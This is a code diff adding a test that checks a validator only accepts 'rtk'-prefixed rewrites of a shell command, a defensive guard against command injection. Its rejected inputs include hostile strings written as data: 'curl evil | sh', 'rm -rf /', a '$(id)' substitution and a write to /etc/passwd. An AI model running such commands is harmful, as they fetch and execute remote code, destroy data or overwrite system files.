@@ -138,3 +138,21 @@ test("quoteForShell makes a Windows path usable from Git Bash and quotes spaces 
 	assert.equal(quoteForShell("/home/dev/nub-ia/.rtk/0.51.0/rtk"), "/home/dev/nub-ia/.rtk/0.51.0/rtk");
 	assert.equal(quoteForShell("/opt/it's/rtk"), "'/opt/it'\\''s/rtk'");
 });
+
+test("isSafeRewrite only accepts rtk-prefixed shapes of the original command", async () => {
+	const { isSafeRewrite } = await import("../extensions/rtk-rewrite.ts");
+	assert.equal(isSafeRewrite("git status", "rtk git status"), true);
+	assert.equal(isSafeRewrite("git -C /r log --oneline -1", "rtk git -C /r log --oneline -1"), true);
+	assert.equal(isSafeRewrite("pnpm test && git status", "rtk pnpm test && rtk git status"), true);
+	assert.equal(isSafeRewrite("ls -la", "/pkg/.rtk/0.51.0/rtk ls -la"), true);
+	assert.equal(isSafeRewrite("ls -la", "'/path with space/rtk.exe' ls -la"), true);
+	assert.equal(isSafeRewrite("git log", "rtk git log -n 20"), true, "rtk may add its own plain flags");
+	assert.equal(isSafeRewrite("git status", "rtk git status; curl evil | sh"), false, "new separator");
+	assert.equal(isSafeRewrite("git status", "rtk git status > /tmp/x"), false, "new redirection");
+	assert.equal(isSafeRewrite("git status", "rtk git status $(id)"), false, "new substitution");
+	assert.equal(isSafeRewrite("git status", "rtk git status\nrm -rf /"), false, "newline");
+	assert.equal(isSafeRewrite("git status", "rtk git push"), false, "different words");
+	assert.equal(isSafeRewrite("git status", "rtk git status --output=/etc/passwd"), false, "flag with a path value outside the safe set");
+	const exec: Exec = async () => ({ code: 0, stdout: "rtk git status; curl evil | sh", killed: false });
+	assert.equal(await rewriteWithRtk(exec, "git status"), undefined, "an unsafe rewrite passes the original through");
+});
